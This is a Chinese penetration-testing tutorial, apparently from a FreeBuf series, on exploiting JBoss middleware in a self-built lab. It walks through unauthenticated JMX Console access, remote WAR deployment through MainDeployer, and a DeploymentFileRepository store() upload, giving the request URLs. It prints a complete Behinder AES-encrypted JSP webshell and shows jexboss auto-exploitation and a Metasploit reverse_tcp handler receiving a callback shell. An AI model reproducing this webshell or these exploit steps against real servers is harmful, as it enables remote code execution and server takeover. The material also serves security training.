## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

中间件是介于应用系统和系统软件之间的一类软件，它使用系统软件所提供的基础服务（功能），衔接网络上应用系统的各个部分或不同的应用，能够达到资源共享、功能共享的目的。

可想而知中间件连接着网络和系统接触着越来越多的关键数据，渐渐成为单位公共安全中最具有战略性的资产，中间件的安全稳定运行也直接决定着业务系统能否正常使用。并且平台的中间件中往往连接数据库，而数据库储存着等极其重要和敏感的信息。如果中间件被攻破，这些信息一旦被篡改或者泄露，轻则造成企业经济损失，重则影响企业形象，甚至行业、社会安全。可见，数据库安全至关重要。所以对数据库的保护是一项必须的，关键的，重要的工作任务。

通过前几期钓鱼、内网攻防篇章落幕后，引来了服务攻防篇章之数据库渗透篇，不管在外网还是内网环境，只要存在业务系统都存在数据库，在渗透测试对数据库的知识学习是必不可少的，接下来将介绍数据库的渗透基本操作，带小伙伴们了解和学习数据库如何渗透的！

今天会讲解到学习高版本JMX Console未授权访问、JMX Console HtmlAdaptor
Getshell利用、总结JBoss渗透思路、jexboss自动化JBoss渗透等渗透操作等，最后远程代码执行控制服务器等操作，如果连JBoss都不会安装操作提权等，怎么进行下一步的研究JBoss安全！怎么拿下对方服务器？

## 二、JBoss渗透攻防

### 1、高版本JMX Console未授权访问

#### 1）未授权访问

JMX Console默认存在未授权访问，直接点击JBoss主页中的JMX Console链接进入JMX Console页面。

![1630730363_6132f87b4cd47c20263d8.png!small?1630730364249](https://image.3001.net/images/20210904/1630730363_6132f87b4cd47c20263d8.png!small?1630730364249)

#### 2）本地搭建部署点

在JMX Console页面点击jboss.system链接，在Jboss.system页面中点击service=MainDeployer，如下：  
![1630730367_6132f87f913f4496767bd.png!small](https://image.3001.net/images/20210904/1630730367_6132f87f913f4496767bd.png!small)

进入service=MainDeployer页面之后，找到methodIndex为17 or 19的deploy 填写远程war包地址进行远程部署：  
![1630731785_6132fe0944bd6dda1b922.png!small?1630731793290](https://image.3001.net/images/20210904/1630731785_6132fe0944bd6dda1b922.png!small?1630731793290)

![1630731790_6132fe0e73016ce9b827d.png!small?1630731793291](https://image.3001.net/images/20210904/1630731790_6132fe0e73016ce9b827d.png!small?1630731793291)![1630731794_6132fe1287b803f7f8c8e.png!small?1630731795629](https://image.3001.net/images/20210904/1630731794_6132fe1287b803f7f8c8e.png!small?1630731795629)

#### 3）搭建远程部署

Kali部署远程war包地址：  
![1630731801_6132fe1908bb482d5c1ac.png!small?1630731802751](https://image.3001.net/images/20210904/1630731801_6132fe1908bb482d5c1ac.png!small?1630731802751)

    
    
    python -m SimpleHTTPServer 80
    

#### 4）上传部署完成控制

然后输入Invoke：  
![1630731813_6132fe25ba37e24612a4e.png!small?1630731814762](https://image.3001.net/images/20210904/1630731813_6132fe25ba37e24612a4e.png!small?1630731814762)

    
    
    http://192.168.253.89:8080/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=17&arg0=http://192.168.253.9/dayutest.war
    

点击后部署成功！

访问：  
![1630732303_6133000f278442e7cd066.png!small?1630732303503](https://image.3001.net/images/20210904/1630732303_6133000f278442e7cd066.png!small?1630732303503)

    
    
    http://192.168.253.89:8080/dayutest/shell.jsp
    

冰蝎成功控制：  
![1630732307_6133001301ee74ea0914f.png!small?1630732308517](https://image.3001.net/images/20210904/1630732307_6133001301ee74ea0914f.png!small?1630732308517)

检查部署位置：

    
    
    C:\jboss-6.1.0.Final\server\default\work\jboss.web\localhost
    

![1630732311_61330017b4b19c75829ae.png!small?1630732313020](https://image.3001.net/images/20210904/1630732311_61330017b4b19c75829ae.png!small?1630732313020)  
可看到部署位置，自动部署出war中的文件！

### 2、JMX Console HtmlAdaptor Getshell利用

#### 1）漏洞简介

此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。该漏洞利用的是后台中`jboss.admin
-> DeploymentFileRepository ->
store()`方法，通过向四个参数传入信息，达到上传shell的目的，其中arg0传入的是部署的war包名字，arg1传入的是上传的文件的文件名，arg2传入的是上传文件的文件格式，arg3传入的是上传文件中的内容。通过控制这四个参数即可上传shell，控制整台服务器。但是通过实验发现，arg1和arg2可以进行文件的拼接，例如arg1=she，arg2=ll.jsp。这个时候服务器还是会进行拼接，将shell.jsp传入到指定路径下！

**影响范围：**4.x及以下

#### 2）本地复现

定位到store位置：

    
    
    http://192.168.253.91:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository
    

![1630732317_6133001d9574df75194bd.png!small?1630732319141](https://image.3001.net/images/20210904/1630732317_6133001d9574df75194bd.png!small?1630732319141)

定位到store⽅法：

    
    
    通过向四个参数传入信息，达到上传shell的目，
    arg1传入的是部署的war包名字
    arg2传入的是上传的文件的文件名
    arg3传入的是上传文件的文件格式
    arg4传入的是上传文件中的内容
    通过控制这四个参数即可上传shell，控制整台服务器。
    

写入war，jsp内容为冰蝎：  
![1630732323_613300236b15229892bd5.png!small?1630732326741](https://image.3001.net/images/20210904/1630732323_613300236b15229892bd5.png!small?1630732326741)  
 **注意为点jsp！！！**

    
    
    <%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
    

![1630732330_6133002a5f9491c32d94b.png!small?1630732331300](https://image.3001.net/images/20210904/1630732330_6133002a5f9491c32d94b.png!small?1630732331300)![1630732335_6133002f1d93368607129.png!small?1630732335559](https://image.3001.net/images/20210904/1630732335_6133002f1d93368607129.png!small?1630732335559)

成功写入，尝试上线冰蝎：  
![1630732342_613300363d3ad06d28f08.png!small?1630732344727](https://image.3001.net/images/20210904/1630732342_613300363d3ad06d28f08.png!small?1630732344727)

## 三、自动化渗透

通过理解以上操作的攻击方法和漏洞产生原因后，可以使用自动化工具进行渗透了！

### 1、jexboss自动化JBoss渗透

jexboss是针对JBoss渗透自动化攻击武器，是用于测试和利用JBoss Application
Server和其他Java平台、框架、应用程序等中的漏洞的工具。

下载地址：

    
    
    https://github.com/joaomatosf/jexboss
    

![1630732351_6133003f8f279c558ba55.png!small?1630732353571](https://image.3001.net/images/20210904/1630732351_6133003f8f279c558ba55.png!small?1630732353571)

    
    
    sudo pip install -r requires.txt
    

![1630732355_613300437499b0d78b722.png!small?1630732365942](https://image.3001.net/images/20210904/1630732355_613300437499b0d78b722.png!small?1630732365942)

#### 2）JBoss4.x及以下版本自动化渗透

演示的攻击环境：JBoss 4.2.3

输入命令：

    
    
    python jexboss.py -host http://192.168.253.91:8080/
    

![1630732361_6133004951551c2b6a303.png!small?1630732365942](https://image.3001.net/images/20210904/1630732361_6133004951551c2b6a303.png!small?1630732365942)

    
    
    您是否要尝试通过“网络控制台”运行自动利用程序？
        如果成功，此操作将提供一个简单的命令外壳来执行
        服务器上的命令。
        仅在获得许可的情况下继续！
        是/否？
    

输入YES即可！这里注意有五种存在漏洞行为！

![1630732371_61330053055b6826f2baf.png!small?1630732374462](https://image.3001.net/images/20210904/1630732371_61330053055b6826f2baf.png!small?1630732374462)  
成功交互！

#### 3）JBoss7.x及以下版本自动化渗透

演示的攻击环境：JBoss 6.x

开始攻击输入：

    
    
    python jexboss.py -host http://192.168.253.89:8080/
    

![1630732378_6133005abc69fd05c1e09.png!small?1630732383302](https://image.3001.net/images/20210904/1630732378_6133005abc69fd05c1e09.png!small?1630732383302)

选择yes获得反弹shell：  
![1630732383_6133005ff349215f2392f.png!small?1630732386953](https://image.3001.net/images/20210904/1630732383_6133005ff349215f2392f.png!small?1630732386953)  
成功控制并交互！

#### 4）分析shell

JBoss4.x进行攻击：  
![1630732390_61330066c0c1c5330c909.png!small?1630732395550](https://image.3001.net/images/20210904/1630732390_61330066c0c1c5330c909.png!small?1630732395550)  
JBoss6.x进行攻击：  
![1630732395_6133006bd69eda076b909.png!small?1630732402111](https://image.3001.net/images/20210904/1630732395_6133006bd69eda076b909.png!small?1630732402111)

通过拒绝发现，每一个漏洞都会提示是否获得shell!!

#### 5）联动MSF

Kali开启监听：  
![1630732400_61330070b92a277411805.png!small?1630732402111](https://image.3001.net/images/20210904/1630732400_61330070b92a277411805.png!small?1630732402111)

    
    
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 192.168.253.9
    exploit -j
    

jexboss获取shell：

    
    
    jexremote=192.168.253.9:4444
    

  
成功联动！！  
  
但是经过测试，只适合linux被攻击者较好，windows被攻击者只能执行一次命令后中断！！

## 四、总结

今天学到了高版本JMX Console未授权访问、JMX Console HtmlAdaptor
Getshell利用、总结JBoss渗透思路、jexboss自动化JBoss渗透等漏洞渗透操作，最后远程代码执行控制服务器等操作，以及整改加固建议的方式方法，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）-> 服务攻防之数据库Mongodb（上）-> 服务攻防之数据库Mongodb（下）-> 服务攻防之中间件IIS（上）-> 服务攻防之中间件IIS（下）-> 服务攻防之中间件Apache（总）-> 服务攻防之中间件Nginx（总）-> 服务攻防之中间件Tomcat（上）-> 服务攻防之中间件Tomcat（下）-> 服务攻防之中间件JBoss（上）-> 服务攻防之中间件JBoss（中）-> 服务攻防之中间件JBoss（下）......
    

接下来在《服务攻防之中间件Weblogic》会接触到如何进行Weblogic简介、Weblogic详细安装、XMLDecoder
反序列化漏洞（CVE-2017-10271 & CVE-2017-3506）、wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725）等渗透操作，如何提权渗透等方法，请看下篇服务攻防之中间件Weblogicb篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

